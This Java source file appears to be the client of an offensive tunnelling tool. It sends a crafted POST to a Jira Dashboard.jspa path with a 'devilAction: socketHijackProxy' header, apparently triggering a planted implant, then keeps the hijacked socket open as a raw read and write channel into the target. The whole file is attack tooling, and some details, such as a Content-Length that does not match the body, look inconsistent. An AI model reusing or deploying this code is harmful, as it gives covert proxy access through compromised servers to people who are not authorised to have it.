package cc.anian.client;

import javax.xml.stream.events.StartDocument;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.nio.charset.StandardCharsets;

public class Tunnel {

    private static SocketChannel outSocket;


    private static final String path = "";
    private static final String host = "127.0.0.1";
    private static final Integer port = 2990;

    public static void init(String target) {
        String host = target.replace("http://", "");
        host = host.replace("https://", "");
        int endIdx = host.indexOf("/");
        if (endIdx > 0){
            host = host.substring(0, endIdx);
        }
        if (host.contains(":")){
            host = host.substring(0, host.indexOf(":"));
        }

        String request = "POST " + target + "/jira/secure/Dashboard.jspa HTTP/1.1\r\n" +
                "Host: " + host + " \r\n" +
                "devilAction: socketHijackProxy\r\n" +
                "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n" +
                "Sec-Fetch-Site: same-origin\r\n" +
                "Sec-Fetch-Mode: navigate\r\n" +
                "Sec-Fetch-User: ?1\r\n" +
                "Sec-Fetch-Dest: document\r\n" +
                "Accept-Encoding: gzip, deflate\r\n" +
                "Accept-Language: zh-CN,zh;q=0.9\r\n" +
                "Connection: close\r\n" +
                "Content-Length: 41\n" +
                "\r\n" +
                "{\"action\":\"create\"}\r\n\r\n";
        try {

        final SocketChannel socketChannel = SocketChannel.open(new InetSocketAddress(host, port));
        socketChannel.configureBlocking(false);//配置通道使用非阻塞模式
        while (!socketChannel.finishConnect()) {
            Thread.sleep(10);
        }
        socketChannel.write(ByteBuffer.wrap(request.getBytes(StandardCharsets.UTF_8)));
        outSocket = socketChannel;

        } catch (Exception e){
            e.printStackTrace();
            throw new RuntimeException("create tunnel failed");
        }
    }




    public static byte[] readByLength(int readLength) {
        ByteBuffer byteBuf = ByteBuffer.allocate(readLength);
        int read = 0;
        while (read < readLength){
            try {
                read += outSocket.read(byteBuf);
            } catch (Exception e){
                e.printStackTrace();
                Runtime.getRuntime().exit(1);
            }
        }
        return byteBuf.array();
    }

    public static void write(ByteBuffer byteBuffer) throws IOException {
        try {
            outSocket.write(byteBuffer);
        } catch (Exception e){
            e.printStackTrace();
            Runtime.getRuntime().exit(1);
        }
    }
}
